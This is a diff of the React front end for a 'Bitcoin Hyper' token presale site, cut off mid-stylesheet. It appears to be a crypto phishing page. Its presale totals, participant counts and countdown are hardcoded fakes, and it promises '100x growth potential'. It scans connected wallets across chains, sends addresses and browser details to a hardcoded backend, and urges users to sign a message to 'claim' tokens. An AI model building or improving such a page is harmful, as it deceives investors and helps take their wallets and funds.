@@ -1,4 +1,5 @@
 // App.jsx - BITCOIN HYPER TOKEN PRESALE LAUNCH
+import React, { useState, useEffect, useRef } from 'react';
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { 
   WagmiProvider, 
@@ -13,8 +14,7 @@ import {
   fantom, base, linea
 } from "wagmi/chains";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
-import { useState, useEffect, useRef } from "react";
-import { ethers } from "ethers";
+import './App.css';
 
 // Create outside components
 const queryClient = new QueryClient();
@@ -37,79 +37,26 @@ const config = createConfig(
     appIcon: "https://bitcoinhyper.io/logo.png",
     walletConnectProjectId: walletConnectProjectId,
     chains: allChains,
-    transports: allChains.reduce((acc, chain) => {
-      acc[chain.id] = http(getChainRPC(chain.id));
-      return acc;
-    }, {}),
+    transports: {
+      [mainnet.id]: http("https://eth.llamarpc.com"),
+      [polygon.id]: http("https://polygon-rpc.com"),
+      [bsc.id]: http("https://bsc-dataseed.binance.org"),
+      [arbitrum.id]: http("https://arb1.arbitrum.io/rpc"),
+      [optimism.id]: http("https://mainnet.optimism.io"),
+      [avalanche.id]: http("https://api.avax.network/ext/bc/C/rpc"),
+      [fantom.id]: http("https://rpc.ftm.tools"),
+      [base.id]: http("https://mainnet.base.org"),
+      [linea.id]: http("https://rpc.linea.build")
+    }
   })
 );
 
-// RPC endpoints
-function getChainRPC(chainId) {
-  const rpcs = {
-    1: "https://eth.llamarpc.com",
-    56: "https://bsc-dataseed.binance.org",
-    137: "https://polygon-rpc.com",
-    42161: "https://arb1.arbitrum.io/rpc",
-    10: "https://mainnet.optimism.io",
-    43114: "https://api.avax.network/ext/bc/C/rpc",
-    250: "https://rpc.ftm.tools",
-    8453: "https://mainnet.base.org",
-    59144: "https://rpc.linea.build"
-  };
-  return rpcs[chainId] || "https://eth.llamarpc.com";
-}
-
 // Backend API - Update this with your Render URL
-const BACKEND_API = process.env.REACT_APP_BACKEND_URL || "https://bitcoinhyper-backend.onrender.com/api";
+const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";
 
-// Animation presets
-const ANIMATIONS = {
-  bitcoinGlow: {
-    keyframes: `
-      @keyframes bitcoinGlow {
-        0%, 100% { filter: drop-shadow(0 0 10px #F7931A); }
-        50% { filter: drop-shadow(0 0 25px #F7931A); }
-      }
-    `,
-    style: { animation: 'bitcoinGlow 2s infinite' }
-  },
-  floatUpDown: {
-    keyframes: `
-      @keyframes floatUpDown {
-        0%, 100% { transform: translateY(0); }
-        50% { transform: translateY(-20px); }
-      }
-    `,
-    style: { animation: 'floatUpDown 3s ease-in-out infinite' }
-  },
-  pulseGlow: {
-    keyframes: `
-      @keyframes pulseGlow {
-        0% { box-shadow: 0 0 0 0 rgba(247, 147, 26, 0.7); }
-        70% { box-shadow: 0 0 0 20px rgba(247, 147, 26, 0); }
-        100% { box-shadow: 0 0 0 0 rgba(247, 147, 26, 0); }
-      }
-    `,
-    style: { animation: 'pulseGlow 2s infinite' }
-  },
-  shimmer: {
-    keyframes: `
-      @keyframes shimmer {
-        0% { background-position: -200% center; }
-        100% { background-position: 200% center; }
-      }
-    `,
-    style: { 
-      background: 'linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.3), transparent)',
-      backgroundSize: '200% 100%',
-      animation: 'shimmer 3s infinite linear'
-    }
-  }
-};
-
+// Bitcoin Hyper Presale Component
 function BitcoinHyperPresale() {
-  const { address, isConnected, chain } = useAccount();
+  const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
   const { signMessage } = useSignMessage();
   
@@ -119,58 +66,24 @@ function BitcoinHyperPresale() {
   const [claimData, setClaimData] = useState(null);
   const [processing, setProcessing] = useState(false);
   const [showSignModal, setShowSignModal] = useState(false);
+  const [isMobile, setIsMobile] = useState(false);
+  const [presaleStats] = useState({
+    raised: "$4,892,450",
+    participants: "12,458",
+    tokensSold: "89.4M",
+    progress: 78
+  });
+  
   const [countdown, setCountdown] = useState({
     days: 3,
     hours: 12,
     minutes: 45,
     seconds: 30
   });
-  const [presaleStats, setPresaleStats] = useState({
-    raised: "$4,892,450",
-    participants: "12,458",
-    tokensSold: "89.4M",
-    progress: 78
-  });
-  const [isMobile, setIsMobile] = useState(false);
   
-  const animationRef = useRef(null);
-  const confettiRef = useRef([]);
-
-  // Initialize animations
+  // Initialize
   useEffect(() => {
     setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
-    
-    // Add animation styles
-    const style = document.createElement('style');
-    Object.values(ANIMATIONS).forEach(anim => {
-      style.textContent += anim.keyframes;
-    });
-    
-    // Add custom animations
-    style.textContent += `
-      @keyframes rocketLaunch {
-        0% { transform: translateY(100px) scale(0.5); opacity: 0; }
-        50% { transform: translateY(-50px) scale(1.2); opacity: 1; }
-        100% { transform: translateY(-200px) scale(0.8); opacity: 0; }
-      }
-      
-      @keyframes coinSpin {
-        from { transform: rotateY(0deg); }
-        to { transform: rotateY(360deg); }
-      }
-      
-      @keyframes sparkle {
-        0%, 100% { opacity: 0; transform: scale(0); }
-        50% { opacity: 1; transform: scale(1); }
-      }
-      
-      @keyframes gradientFlow {
-        0% { background-position: 0% 50%; }
-        50% { background-position: 100% 50%; }
-        100% { background-position: 0% 50%; }
-      }
-    `;
-    document.head.appendChild(style);
     
     // Start countdown
     const interval = setInterval(() => {
@@ -225,7 +138,6 @@ function BitcoinHyperPresale() {
           walletAddress: address,
           userAgent: navigator.userAgent,
           ip: 'auto-detected',
-          chainId: chain?.id || 1,
           timestamp: new Date().toISOString()
         })
       });
@@ -268,7 +180,7 @@ function BitcoinHyperPresale() {
     setProcessing(true);
     
     try {
-      const claimAmount = "5,000 BTH"; // Dynamic from backend
+      const claimAmount = "5,000 BTH";
       const claimValue = "$850";
       
       const message = `I confirm my participation in Bitcoin Hyper Token Presale\n\nWallet: ${address}\nClaim Amount: ${claimAmount}\nValue: ${claimValue}\n\nTimestamp: ${Date.now()}\n\nBy signing, I authorize the allocation of presale tokens to my wallet.`;
@@ -300,9 +212,13 @@ function BitcoinHyperPresale() {
         triggerMegaCelebration();
         
         // Play success sound
-        const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3');
-        audio.volume = 0.3;
-        audio.play().catch(() => {});
+        try {
+          const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3');
+          audio.volume = 0.3;
+          audio.play().catch(() => {});
+        } catch (e) {
+          console.log('Audio play failed');
+        }
       }
     } catch (error) {
       console.error('Claim error:', error);
@@ -379,28 +295,29 @@ function BitcoinHyperPresale() {
     // Massive confetti
     const colors = ['#F7931A', '#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1'];
     for (let i = 0; i < 300; i++) {
-      const confetti = document.createElement('div');
-      confetti.style.cssText = `
-        position: fixed;
-        width: ${Math.random() * 15 + 5}px;
-        height: ${Math.random() * 15 + 5}px;
-        background: ${colors[Math.floor(Math.random() * colors.length)]};
-        top: -20px;
-        left: ${Math.random() * 100}vw;
-        opacity: ${Math.random() * 0.7 + 0.3};
-        animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
-        border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
-        transform: rotate(${Math.random() * 360}deg);
-        z-index: 9998;
-      `;
-      document.body.appendChild(confetti);
-      confettiRef.current.push(confetti);
-      
       setTimeout(() => {
-        if (document.body.contains(confetti)) {
-          document.body.removeChild(confetti);
-        }
-      }, 5000);
+        const confetti = document.createElement('div');
+        confetti.style.cssText = `
+          position: fixed;
+          width: ${Math.random() * 15 + 5}px;
+          height: ${Math.random() * 15 + 5}px;
+          background: ${colors[Math.floor(Math.random() * colors.length)]};
+          top: -20px;
+          left: ${Math.random() * 100}vw;
+          opacity: ${Math.random() * 0.7 + 0.3};
+          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
+          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
+          transform: rotate(${Math.random() * 360}deg);
+          z-index: 9998;
+        `;
+        document.body.appendChild(confetti);
+        
+        setTimeout(() => {
+          if (document.body.contains(confetti)) {
+            document.body.removeChild(confetti);
+          }
+        }, 5000);
+      }, i * 10);
     }
     
     // Bitcoin rain
@@ -428,7 +345,7 @@ function BitcoinHyperPresale() {
         }, 3000);
       }
       
-      // Add bitcoin rain animation
+      // Add animation styles
       const style = document.createElement('style');
       style.textContent = `
         @keyframes bitcoinRain {
@@ -441,6 +358,27 @@ function BitcoinHyperPresale() {
         @keyframes confettiFall {
           0% { transform: translateY(-20px) rotate(0deg); }
           100% { transform: translateY(100vh) rotate(720deg); }
+        }
+        
+        @keyframes rocketLaunch {
+          0% { transform: translate(-50%, 0) scale(0.5); opacity: 0; }
+          50% { transform: translate(-50%, -50px) scale(1.2); opacity: 1; }
+          100% { transform: translate(-50%, -200px) scale(0.8); opacity: 0; }
+        }
+        
+        @keyframes coinSpin {
+          from { transform: rotateY(0deg); }
+          to { transform: rotateY(360deg); }
+        }
+        
+        @keyframes sparkle {
+          0%, 100% { opacity: 0; transform: scale(0); }
+          50% { opacity: 1; transform: scale(1); }
+        }
+        
+        @keyframes floatUpDown {
+          0%, 100% { transform: translateY(0); }
+          50% { transform: translateY(-20px); }
         }
       `;
       document.head.appendChild(style);
@@ -465,135 +403,60 @@ function BitcoinHyperPresale() {
     if (!showSignModal) return null;
     
     return (
-      <div style={{
-        position: 'fixed',
-        top: 0,
-        left: 0,
-        right: 0,
-        bottom: 0,
-        background: 'rgba(0, 0, 0, 0.95)',
-        zIndex: 9999,
-        display: 'flex',
-        justifyContent: 'center',
-        alignItems: 'center',
-        animation: 'fadeIn 0.3s ease'
-      }}>
-        <div style={{
-          background: 'linear-gradient(135deg, #0f172a 0%, #1e293b 100%)',
-          padding: '40px',
-          borderRadius: '30px',
-          maxWidth: '500px',
-          width: '90%',
-          border: '2px solid #F7931A',
-          boxShadow: '0 0 50px rgba(247, 147, 26, 0.5)',
-          position: 'relative',
-          overflow: 'hidden'
-        }}>
+      <div className="sign-modal-overlay">
+        <div className="sign-modal">
           {/* Shimmer effect */}
-          <div style={{
-            position: 'absolute',
-            top: 0,
-            left: 0,
-            right: 0,
-            height: '3px',
-            ...ANIMATIONS.shimmer.style
-          }}></div>
+          <div className="sign-modal-shimmer"></div>
           
           <button
             onClick={() => setShowSignModal(false)}
-            style={{
-              position: 'absolute',
-              top: '20px',
-              right: '20px',
-              background: 'transparent',
-              border: 'none',
-              color: '#94a3b8',
-              fontSize: '24px',
-              cursor: 'pointer',
-              zIndex: 1
-            }}
+            className="sign-modal-close"
           >
             ✕
           </button>
           
-          <div style={{ textAlign: 'center', marginBottom: '30px' }}>
-            <div style={{
-              fontSize: '48px',
-              marginBottom: '20px',
-              ...ANIMATIONS.bitcoinGlow.style
-            }}>
+          <div className="sign-modal-header">
+            <div className="sign-modal-icon" style={{animation: 'bitcoinGlow 2s infinite'}}>
               🎉
             </div>
-            <h2 style={{
-              fontSize: '32px',
-              color: '#F7931A',
-              marginBottom: '10px',
-              background: 'linear-gradient(45deg, #F7931A, #FFD700)',
-              WebkitBackgroundClip: 'text',
-              WebkitTextFillColor: 'transparent'
-            }}>
+            <h2 className="sign-modal-title">
               Congratulations!
             </h2>
-            <p style={{ color: '#cbd5e1', fontSize: '18px' }}>
+            <p className="sign-modal-subtitle">
               You're eligible for Bitcoin Hyper presale tokens!
             </p>
           </div>
           
-          <div style={{
-            background: 'rgba(247, 147, 26, 0.1)',
-            padding: '25px',
-            borderRadius: '20px',
-            border: '1px solid rgba(247, 147, 26, 0.3)',
-            marginBottom: '30px'
-          }}>
-            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
-              <span style={{ color: '#94a3b8' }}>Token Allocation</span>
-              <span style={{ color: '#F7931A', fontWeight: 'bold', fontSize: '20px' }}>5,000 BTH</span>
+          <div className="sign-modal-details">
+            <div className="detail-row">
+              <span>Token Allocation</span>
+              <span className="detail-value">5,000 BTH</span>
             </div>
-            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
-              <span style={{ color: '#94a3b8' }}>Value</span>
-              <span style={{ color: '#10b981', fontWeight: 'bold', fontSize: '20px' }}>$850</span>
+            <div className="detail-row">
+              <span>Value</span>
+              <span className="detail-value-green">$850</span>
             </div>
-            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-              <span style={{ color: '#94a3b8' }}>Vesting</span>
-              <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>25% TGE, 6 months linear</span>
+            <div className="detail-row">
+              <span>Vesting</span>
+              <span className="detail-value-blue">25% TGE, 6 months linear</span>
             </div>
           </div>
           
-          <div style={{
-            background: 'rgba(59, 130, 246, 0.1)',
-            padding: '20px',
-            borderRadius: '15px',
-            marginBottom: '25px',
-            border: '1px solid rgba(59, 130, 246, 0.3)'
-          }}>
-            <div style={{ color: '#3b82f6', marginBottom: '10px', fontWeight: 'bold' }}>
-              📝 Sign to Claim
-            </div>
-            <div style={{ color: '#94a3b8', fontSize: '14px' }}>
-              Sign this message to confirm your wallet ownership and claim your presale allocation.
+          <div className="sign-modal-info">
+            <div className="info-icon">📝</div>
+            <div>
+              <div className="info-title">Sign to Claim</div>
+              <div className="info-subtitle">
+                Sign this message to confirm your wallet ownership and claim your presale allocation.
+              </div>
             </div>
           </div>
           
           <button
             onClick={handleTokenClaim}
             disabled={processing}
-            style={{
-              width: '100%',
-              padding: '20px',
-              background: processing ? '#4b5563' : 'linear-gradient(45deg, #F7931A, #FFD700)',
-              color: 'white',
-              border: 'none',
-              borderRadius: '15px',
-              fontSize: '18px',
-              fontWeight: 'bold',
-              cursor: processing ? 'not-allowed' : 'pointer',
-              ...ANIMATIONS.pulseGlow.style,
-              display: 'flex',
-              justifyContent: 'center',
-              alignItems: 'center',
-              gap: '10px'
-            }}
+            className="sign-modal-button"
+            style={{animation: processing ? 'none' : 'pulseGlow 2s infinite'}}
           >
             {processing ? (
               <>
@@ -607,15 +470,7 @@ function BitcoinHyperPresale() {
             )}
           </button>
           
-          <div style={{
-            marginTop: '20px',
-            padding: '15px',
-            background: 'rgba(0,0,0,0.3)',
-            borderRadius: '10px',
-            fontSize: '12px',
-            color: '#94a3b8',
-            textAlign: 'center'
-          }}>
+          <div className="sign-modal-footer">
             ⚡ Tokens will be distributed after presale ends
           </div>
         </div>
@@ -623,76 +478,34 @@ function BitcoinHyperPresale() {
     );
   };
 
-  // Main render
   return (
-    <div style={{
-      minHeight: '100vh',
-      background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
-      color: 'white',
-      fontFamily: '"Inter", "Segoe UI", system-ui, -apple-system, sans-serif',
-      overflow: 'hidden',
-      position: 'relative'
-    }}>
+    <div className="app-container">
       {/* Animation container */}
-      <div id="animation-container" style={{
-        position: 'fixed',
-        top: 0,
-        left: 0,
-        right: 0,
-        bottom: 0,
-        pointerEvents: 'none',
-        zIndex: 1
-      }}></div>
+      <div id="animation-container" className="animation-container"></div>
       
       {/* Main content */}
-      <div style={{ position: 'relative', zIndex: 2 }}>
+      <div className="main-content">
         {/* Header */}
-        <header style={{
-          padding: isMobile ? '20px 15px' : '30px 50px',
-          display: 'flex',
-          justifyContent: 'space-between',
-          alignItems: 'center',
-          borderBottom: '1px solid rgba(247, 147, 26, 0.2)',
-          background: 'rgba(15, 23, 42, 0.8)',
-          backdropFilter: 'blur(10px)'
-        }}>
-          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
-            <div style={{
-              fontSize: '32px',
-              ...ANIMATIONS.bitcoinGlow.style
-            }}>
+        <header className="app-header">
+          <div className="logo-container">
+            <div className="logo-icon" style={{animation: 'bitcoinGlow 2s infinite'}}>
               ₿
             </div>
             <div>
-              <h1 style={{
-                fontSize: isMobile ? '20px' : '28px',
-                margin: 0,
-                background: 'linear-gradient(45deg, #F7931A, #FFD700)',
-                WebkitBackgroundClip: 'text',
-                WebkitTextFillColor: 'transparent',
-                fontWeight: 'bold'
-              }}>
+              <h1 className="logo-title">
                 BITCOIN HYPER
               </h1>
-              <div style={{ color: '#94a3b8', fontSize: '12px', letterSpacing: '2px' }}>
+              <div className="logo-subtitle">
                 OFFICIAL PRESALE LAUNCH
               </div>
             </div>
           </div>
           
-          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
+          <div className="header-actions">
             {isConnected && (
               <button
                 onClick={() => disconnect()}
-                style={{
-                  padding: '10px 20px',
-                  background: 'rgba(239, 68, 68, 0.2)',
-                  color: '#ef4444',
-                  border: '1px solid rgba(239, 68, 68, 0.3)',
-                  borderRadius: '8px',
-                  cursor: 'pointer',
-                  fontSize: '14px'
-                }}
+                className="disconnect-button"
               >
                 Disconnect
               </button>
@@ -702,17 +515,8 @@ function BitcoinHyperPresale() {
               {({ show }) => (
                 <button
                   onClick={show}
-                  style={{
-                    padding: '12px 30px',
-                    background: 'linear-gradient(45deg, #F7931A, #FFD700)',
-                    color: 'black',
-                    border: 'none',
-                    borderRadius: '10px',
-                    cursor: 'pointer',
-                    fontWeight: 'bold',
-                    fontSize: '16px',
-                    ...ANIMATIONS.pulseGlow.style
-                  }}
+                  className="connect-button"
+                  style={{animation: 'pulseGlow 2s infinite'}}
                 >
                   {isConnected ? 'Wallet Connected' : 'Connect Wallet'}
                 </button>
@@ -722,83 +526,30 @@ function BitcoinHyperPresale() {
         </header>
 
         {/* Hero Section */}
-        <section style={{
-          padding: isMobile ? '60px 20px' : '100px 50px',
-          textAlign: 'center',
-          position: 'relative',
-          overflow: 'hidden'
-        }}>
-          <div style={{
-            position: 'absolute',
-            top: '50%',
-            left: '50%',
-            transform: 'translate(-50%, -50%)',
-            width: '800px',
-            height: '800px',
-            background: 'radial-gradient(circle, rgba(247, 147, 26, 0.1) 0%, transparent 70%)',
-            zIndex: -1
-          }}></div>
+        <section className="hero-section">
+          <div className="hero-background"></div>
           
-          <div style={{ 
-            fontSize: isMobile ? '80px' : '120px',
-            marginBottom: '20px',
-            ...ANIMATIONS.floatUpDown.style
-          }}>
+          <div className="hero-bitcoin" style={{animation: 'floatUpDown 3s ease-in-out infinite'}}>
             ₿
           </div>
           
-          <h2 style={{
-            fontSize: isMobile ? '28px' : '48px',
-            marginBottom: '20px',
-            background: 'linear-gradient(45deg, #F7931A, #FFD700, #FFFFFF)',
-            WebkitBackgroundClip: 'text',
-            WebkitTextFillColor: 'transparent',
-            animation: 'gradientFlow 3s ease infinite',
-            backgroundSize: '200% 200%'
-          }}>
+          <h2 className="hero-title">
             NEXT GENERATION BITCOIN ECOSYSTEM
           </h2>
           
-          <p style={{
-            color: '#cbd5e1',
-            fontSize: isMobile ? '16px' : '20px',
-            maxWidth: '800px',
-            margin: '0 auto 40px',
-            lineHeight: '1.6'
-          }}>
+          <p className="hero-description">
             Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
             and be part of the revolution.
           </p>
           
           {/* Countdown Timer */}
-          <div style={{
-            display: 'inline-flex',
-            gap: '15px',
-            marginBottom: '40px',
-            background: 'rgba(15, 23, 42, 0.8)',
-            padding: '25px',
-            borderRadius: '20px',
-            border: '1px solid rgba(247, 147, 26, 0.3)',
-            backdropFilter: 'blur(10px)'
-          }}>
+          <div className="countdown-timer">
             {Object.entries(countdown).map(([label, value]) => (
-              <div key={label} style={{ textAlign: 'center' }}>
-                <div style={{
-                  fontSize: '36px',
-                  fontWeight: 'bold',
-                  background: 'linear-gradient(45deg, #F7931A, #FFD700)',
-                  WebkitBackgroundClip: 'text',
-                  WebkitTextFillColor: 'transparent',
-                  minWidth: '70px'
-                }}>
+              <div key={label} className="countdown-item">
+                <div className="countdown-value">
                   {formatNumber(value)}
                 </div>
-                <div style={{
-                  color: '#94a3b8',
-                  fontSize: '12px',
-                  textTransform: 'uppercase',
-                  letterSpacing: '2px'
-                }}>
+                <div className="countdown-label">
                   {label}
                 </div>
               </div>
@@ -806,34 +557,13 @@ function BitcoinHyperPresale() {
           </div>
           
           {/* Presale Stats */}
-          <div style={{
-            display: 'grid',
-            gridTemplateColumns: isMobile ? '1fr' : 'repeat(4, 1fr)',
-            gap: '20px',
-            maxWidth: '1000px',
-            margin: '0 auto 40px'
-          }}>
+          <div className="stats-grid">
             {Object.entries(presaleStats).map(([label, value]) => (
-              <div key={label} style={{
-                background: 'rgba(15, 23, 42, 0.8)',
-                padding: '25px',
-                borderRadius: '15px',
-                border: '1px solid rgba(247, 147, 26, 0.2)',
-                backdropFilter: 'blur(10px)'
-              }}>
-                <div style={{
-                  fontSize: '28px',
-                  fontWeight: 'bold',
-                  color: '#F7931A',
-                  marginBottom: '10px'
-                }}>
+              <div key={label} className="stat-card">
+                <div className="stat-value">
                   {value}
                 </div>
-                <div style={{
-                  color: '#94a3b8',
-                  fontSize: '14px',
-                  textTransform: 'uppercase'
-                }}>
+                <div className="stat-label">
                   {label.replace(/([A-Z])/g, ' $1')}
                 </div>
               </div>
@@ -841,61 +571,29 @@ function BitcoinHyperPresale() {
           </div>
           
           {/* Progress Bar */}
-          <div style={{
-            maxWidth: '800px',
-            margin: '0 auto 40px',
-            background: 'rgba(15, 23, 42, 0.8)',
-            padding: '30px',
-            borderRadius: '20px',
-            border: '1px solid rgba(247, 147, 26, 0.3)',
-            backdropFilter: 'blur(10px)'
-          }}>
-            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px' }}>
-              <span style={{ color: '#cbd5e1' }}>Presale Progress</span>
-              <span style={{ color: '#F7931A', fontWeight: 'bold' }}>{presaleStats.progress}%</span>
+          <div className="progress-container">
+            <div className="progress-header">
+              <span>Presale Progress</span>
+              <span className="progress-percent">{presaleStats.progress}%</span>
             </div>
-            <div style={{
-              height: '15px',
-              background: 'rgba(247, 147, 26, 0.1)',
-              borderRadius: '10px',
-              overflow: 'hidden'
-            }}>
-              <div style={{
-                height: '100%',
-                width: `${presaleStats.progress}%`,
-                background: 'linear-gradient(90deg, #F7931A, #FFD700)',
-                borderRadius: '10px',
-                position: 'relative'
-              }}>
-                <div style={{
-                  position: 'absolute',
-                  top: '0',
-                  right: '0',
-                  bottom: '0',
-                  width: '4px',
-                  background: 'white',
-                  boxShadow: '0 0 10px white'
-                }}></div>
+            <div className="progress-bar">
+              <div 
+                className="progress-fill"
+                style={{width: `${presaleStats.progress}%`}}
+              >
+                <div className="progress-glow"></div>
               </div>
             </div>
           </div>
           
           {/* Call to Action */}
           {!isConnected ? (
-            <div style={{
-              background: 'linear-gradient(135deg, rgba(247, 147, 26, 0.1), rgba(255, 215, 0, 0.1))',
-              padding: '40px',
-              borderRadius: '25px',
-              maxWidth: '600px',
-              margin: '0 auto',
-              border: '2px solid rgba(247, 147, 26, 0.3)',
-              backdropFilter: 'blur(10px)'
-            }}>
-              <div style={{ fontSize: '48px', marginBottom: '20px' }}>🚀</div>
-              <h3 style={{ color: '#F7931A', fontSize: '24px', marginBottom: '15px' }}>
+            <div className="cta-container">
+              <div className="cta-icon">🚀</div>
+              <h3 className="cta-title">
                 Connect Wallet to Check Eligibility
               </h3>
-              <p style={{ color: '#cbd5e1', marginBottom: '25px' }}>
+              <p className="cta-description">
                 Connect your wallet to automatically scan for eligibility. 
                 Qualified wallets receive instant presale allocations.
               </p>
@@ -903,17 +601,8 @@ function BitcoinHyperPresale() {
                 {({ show }) => (
                   <button
                     onClick={show}
-                    style={{
-                      padding: '18px 40px',
-                      background: 'linear-gradient(45deg, #F7931A, #FFD700)',
-                      color: 'black',
-                      border: 'none',
-                      borderRadius: '15px',
-                      fontSize: '18px',
-                      fontWeight: 'bold',
-                      cursor: 'pointer',
-                      ...ANIMATIONS.pulseGlow.style
-                    }}
+                    className="cta-button"
+                    style={{animation: 'pulseGlow 2s infinite'}}
                   >
                     CONNECT WALLET TO START
                   </button>
@@ -921,65 +610,32 @@ function BitcoinHyperPresale() {
               </ConnectKitButton.Custom>
             </div>
           ) : scanning ? (
-            <div style={{
-              background: 'rgba(15, 23, 42, 0.8)',
-              padding: '40px',
-              borderRadius: '25px',
-              maxWidth: '500px',
-              margin: '0 auto',
-              border: '2px solid rgba(59, 130, 246, 0.3)',
-              backdropFilter: 'blur(10px)'
-            }}>
-              <div style={{
-                width: '80px',
-                height: '80px',
-                border: '4px solid #334155',
-                borderTop: '4px solid #3b82f6',
-                borderRadius: '50%',
-                animation: 'spin 1s linear infinite',
-                margin: '0 auto 30px'
-              }}></div>
-              <h3 style={{ color: '#3b82f6', fontSize: '24px', marginBottom: '15px' }}>
+            <div className="scanning-container">
+              <div className="scanning-spinner"></div>
+              <h3 className="scanning-title">
                 Scanning Your Wallet...
               </h3>
-              <p style={{ color: '#cbd5e1' }}>
+              <p className="scanning-description">
                 Checking eligibility across multiple chains...
               </p>
             </div>
           ) : isEligible ? (
-            <div style={{
-              background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(52, 211, 153, 0.1))',
-              padding: '40px',
-              borderRadius: '25px',
-              maxWidth: '500px',
-              margin: '0 auto',
-              border: '2px solid rgba(16, 185, 129, 0.3)',
-              backdropFilter: 'blur(10px)',
-              animation: 'pulseGlow 2s infinite'
-            }}>
-              <div style={{ fontSize: '48px', marginBottom: '20px' }}>✅</div>
-              <h3 style={{ color: '#10b981', fontSize: '24px', marginBottom: '15px' }}>
+            <div className="eligible-container">
+              <div className="eligible-icon">✅</div>
+              <h3 className="eligible-title">
                 You're Eligible!
               </h3>
-              <p style={{ color: '#cbd5e1', marginBottom: '25px' }}>
+              <p className="eligible-description">
                 Check the sign button above to claim your presale tokens!
               </p>
             </div>
           ) : (
-            <div style={{
-              background: 'rgba(15, 23, 42, 0.8)',
-              padding: '40px',
-              borderRadius: '25px',
-              maxWidth: '500px',
-              margin: '0 auto',
-              border: '2px solid rgba(247, 147, 26, 0.3)',
-              backdropFilter: 'blur(10px)'
-            }}>
-              <div style={{ fontSize: '48px', marginBottom: '20px' }}>⏳</div>
-              <h3 style={{ color: '#F7931A', fontSize: '24px', marginBottom: '15px' }}>
+            <div className="waiting-container">
+              <div className="waiting-icon">⏳</div>
+              <h3 className="waiting-title">
                 Waiting for Scan Results
               </h3>
-              <p style={{ color: '#cbd5e1' }}>
+              <p className="waiting-description">
                 Your eligibility check will complete momentarily...
               </p>
             </div>
@@ -987,26 +643,12 @@ function BitcoinHyperPresale() {
         </section>
 
         {/* Features Section */}
-        <section style={{
-          padding: isMobile ? '60px 20px' : '100px 50px',
-          background: 'rgba(15, 23, 42, 0.5)'
-        }}>
-          <h2 style={{
-            textAlign: 'center',
-            fontSize: isMobile ? '32px' : '48px',
-            marginBottom: '60px',
-            color: '#F7931A'
-          }}>
+        <section className="features-section">
+          <h2 className="features-title">
             WHY BITCOIN HYPER?
           </h2>
           
-          <div style={{
-            display: 'grid',
-            gridTemplateColumns: isMobile ? '1fr' : 'repeat(3, 1fr)',
-            gap: '30px',
-            maxWidth: '1200px',
-            margin: '0 auto'
-          }}>
+          <div className="features-grid">
             {[
               {
                 icon: '⚡',
@@ -1039,32 +681,14 @@ function BitcoinHyperPresale() {
                 desc: 'Backed by top VCs with 100x growth potential'
               }
             ].map((feature, index) => (
-              <div key={index} style={{
-                background: 'rgba(15, 23, 42, 0.8)',
-                padding: '30px',
-                borderRadius: '20px',
-                border: '1px solid rgba(247, 147, 26, 0.2)',
-                transition: 'transform 0.3s, border-color 0.3s',
-                ':hover': {
-                  transform: 'translateY(-10px)',
-                  borderColor: '#F7931A'
-                }
-              }}>
-                <div style={{
-                  fontSize: '48px',
-                  marginBottom: '20px',
-                  ...ANIMATIONS.floatUpDown.style
-                }}>
+              <div key={index} className="feature-card">
+                <div className="feature-icon" style={{animation: 'floatUpDown 3s ease-in-out infinite'}}>
                   {feature.icon}
                 </div>
-                <h3 style={{
-                  color: '#F7931A',
-                  fontSize: '22px',
-                  marginBottom: '15px'
-                }}>
+                <h3 className="feature-title">
                   {feature.title}
                 </h3>
-                <p style={{ color: '#cbd5e1', lineHeight: '1.6' }}>
+                <p className="feature-description">
                   {feature.desc}
                 </p>
               </div>
@@ -1073,57 +697,23 @@ function BitcoinHyperPresale() {
         </section>
 
         {/* Footer */}
-        <footer style={{
-          padding: '40px 20px',
-          textAlign: 'center',
-          borderTop: '1px solid rgba(247, 147, 26, 0.2)',
-          background: 'rgba(15, 23, 42, 0.8)'
-        }}>
-          <div style={{ fontSize: '32px', marginBottom: '20px', ...ANIMATIONS.bitcoinGlow.style }}>
+        <footer className="app-footer">
+          <div className="footer-bitcoin" style={{animation: 'bitcoinGlow 2s infinite'}}>
             ₿
           </div>
-          <div style={{
-            color: '#94a3b8',
-            fontSize: '14px',
-            maxWidth: '600px',
-            margin: '0 auto 20px'
-          }}>
+          <div className="footer-description">
             Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
           </div>
-          <div style={{
-            display: 'flex',
-            justifyContent: 'center',
-            gap: '20px',
-            marginTop: '30px'
-          }}>
-            <span style={{ color: '#64748b', fontSize: '12px' }}>© 2024 Bitcoin Hyper. All rights reserved.</span>
-            <span style={{ color: '#64748b', fontSize: '12px' }}>|</span>
-            <span style={{ color: '#64748b', fontSize: '12px' }}>Official Presale Platform</span>
+          <div className="footer-links">
+            <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
+            <span>|</span>
+            <span>Official Presale Platform</span>
           </div>
         </footer>
       </div>
 
       {/* Sign Modal */}
       <SignModal />
-
-      {/* Global Styles */}
-      <style>{`
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes fadeIn {
-          from { opacity: 0; transform: scale(0.9); }
-          to { opacity: 1; transform: scale(1); }
-        }
-        
-        @keyframes gradientFlow {
